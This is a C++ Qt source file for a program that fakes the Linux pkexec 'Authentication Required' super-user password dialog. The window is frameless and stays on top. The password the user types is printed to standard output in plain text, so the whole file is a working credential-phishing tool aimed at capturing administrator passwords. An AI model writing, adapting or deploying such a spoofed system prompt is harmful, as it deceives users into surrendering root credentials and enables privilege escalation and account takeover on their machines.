#include <cstdio>
#include <cmath>
#include <fcntl.h>
#include <semaphore.h>
#include <unistd.h>

#include <QApplication>
#include <QDialog>
#include <QLabel>
#include <QLineEdit>
#include <QPushButton>
#include <QHBoxLayout>
#include <QScreen>
#include <QRect>
#include <QPainter>
#include <QTimer>
#include <sys/mman.h>

/*
How to compile:
g++ window-launcher.cpp -o window-launcher `pkg-config --cflags --libs Qt6Widgets`
*/

class PkexecRemakeWindow : public QDialog
{
  public:
    PkexecRemakeWindow(QWidget *parent = nullptr) : QDialog(parent)
    {
      setFixedSize(400, 400);

      setWindowFlag(Qt::Dialog);
      setWindowFlag(Qt::WindowStaysOnTopHint);
      setWindowFlag(Qt::FramelessWindowHint);
      setAttribute(Qt::WA_TranslucentBackground);

      auto *heading = new QLabel("Authentication Required");
      QFont font = heading->font();
      font.setPointSize(14);
      font.setBold(true);
      heading->setFont(font);
      heading->setAlignment(Qt::AlignCenter);

      auto *small_message = new QLabel("Authentication is required to run ... \nas super-user");
      small_message->setWordWrap(true);
      small_message->setAlignment(Qt::AlignCenter);


      QPushButton *cancelButton = new QPushButton("Cancel");
      cancelButton->setStyleSheet(buttonStyle);
      cancelButton->setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Preferred);
      connect(cancelButton, &QPushButton::clicked, this, &QDialog::reject);

      QPushButton *authButton = new QPushButton("Authenticate");
      authButton->setStyleSheet(buttonStyle);
      authButton->setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Preferred);
      connect(authButton, &QPushButton::clicked, this, &PkexecRemakeWindow::onAuthenticate);

      passwordField = new QLineEdit();
      passwordField->setEchoMode(QLineEdit::Password);
      passwordField->setPlaceholderText("Password");
      connect(passwordField, &QLineEdit::returnPressed, this, &PkexecRemakeWindow::onAuthenticate);

      QHBoxLayout *buttonLayout = new QHBoxLayout();
      buttonLayout->setSpacing(0);
      buttonLayout->setContentsMargins(0,0,0,0);
      buttonLayout->addWidget(cancelButton);
      buttonLayout->addWidget(authButton);

      auto *layout = new QVBoxLayout();
      layout->addStretch();
      layout->addWidget(heading);
      layout->addWidget(small_message);
      layout->addWidget(passwordField);
      layout->addStretch();
      layout->addLayout(buttonLayout);
      layout->setSpacing(10);

      setLayout(layout);
    }
  private:
    void paintEvent(QPaintEvent *event) override
    {
      Q_UNUSED(event);
      QPainter painter(this);
      painter.setRenderHint(QPainter::Antialiasing);
      painter.setBrush(QBrush(Qt::white));
      painter.setPen(Qt::NoPen);
      painter.drawRoundedRect(rect(), 10, 10);
    }
    void onAuthenticate()
    {
      QString password = passwordField->text();
      printf("Entered password: %s\n", password.toUtf8().constData());
      fflush(stdout);
      accept(); // close the dialog
    }


    QLineEdit *passwordField;
    QString buttonStyle = "QPushButton { background-color: #e6e6e6; border-radius: 0px; padding: 10px; }"
    "QPushButton:hover { background-color: #d3d3d3; }";
};

int main(int argc, char *argv[])
{
  QApplication app(argc, argv);

  PkexecRemakeWindow remakeWindow;
  if (remakeWindow.exec() == QDialog::Accepted)
  {
    exit(0);
  }
}
